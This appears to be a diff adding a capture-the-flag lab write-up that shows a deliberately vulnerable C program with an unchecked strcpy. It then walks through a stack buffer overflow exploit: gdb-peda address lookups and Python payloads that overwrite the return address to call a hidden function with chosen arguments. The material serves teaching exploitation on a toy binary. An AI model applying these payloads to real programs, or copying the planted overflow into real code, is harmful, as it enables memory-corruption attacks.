@@ -167,6 +167,93 @@ output:
 ```shell script --output
 You made it! The shell() function is executed
 ```
+## ctf.c
+***
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void myfunc(int p, int q)
+{
+	char filebuf[64];
+	FILE *f = fopen("flag1.txt","r");
+	if (f == NULL) {
+		printf("flag1 is missing!\n");
+		exit(0);
+	}
+	fgets(filebuf,64,f);
 
-
-
+	printf("myfunc is reached");
+	if (p!=0x04081211)
+	{
+		printf(", but you fail to get the flag");
+		return;
+	}
+	if (q!=0x44644262)
+	{
+		printf(", but you fail to get the flag");
+		return;
+	}
+	printf("You got the flag\n"); 
+}
+void vuln(char* s)
+{
+	char buf[100];
+	strcpy(buf,s);
+	puts(buf);
+}
+int main(int argc, char* argv[])
+{
+	vuln(argv[1]);
+    return 0;
+} 
+```
+Firstly, we need to compile the code.
+```shell script --compile
+$ gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2
+```
+Then, we open the binary in gdb.
+```shell script --gdb
+$ gdb -q ./ctf.out
+```
+In order to run the myfunc function, we need to overwrite the return address of the vuln function with the address of the myfunc function.
+And to do that we need to find the address of the myfunc function.
+```shell script --gdb-peda
+gdb-peda$ p myfunc
+```
+output:
+```shell script --gdb-peda --output
+$1 = {void (int, int)} 0x804851b <myfunc>
+```
+We know the stack frame of the vuln function
+![stack-frame]()
+We know the array is 100 bytes long, and ebp is 4 bytes long, so we need to overwrite 104 bytes to reach the return address.
+```shell script
+$ echo $(python -c 'print "A"*104 + "\x1b\x85\x04\x08"') | ./ctf.out
+```
+output:
+```shell script --output
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA♦
+Segmentation fault
+```
+If we want to get the flag, we need to overwrite the p and q variables with the correct values.
+To do that we need to consider what will happen when we call the return address in the vuln function is called.
+![stack-frame]()
+![stack-frame]()
+As we can see, if we want to overwrite the p and q variables, we will need to overwrite 8 bytes in the main stack frame.
+And to ensure that the Segmentation fault never happens, we will also to overwrite the variable s as the exit function address of the system.
+```shell script --gdb-peda
+gdb-peda$ p exit
+```
+output:
+```shell script --gdb-peda --output
+$1 = {<text variable, no debug info>} 0x80483e0 <exit@plt>
+```
+```shell script
+$ ./ctf.out $(python -c 'print "A"*104 + "\x1b\x85\x04\x08" + "\xe0\x83\x04\x08" + "\x11\x12\x08\x04" + "\x62\x42\x64\x44"')
+```
+output:
+```shell script --output
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��◄♦bBdD
+myfunc is reachedYou got the flag
+```
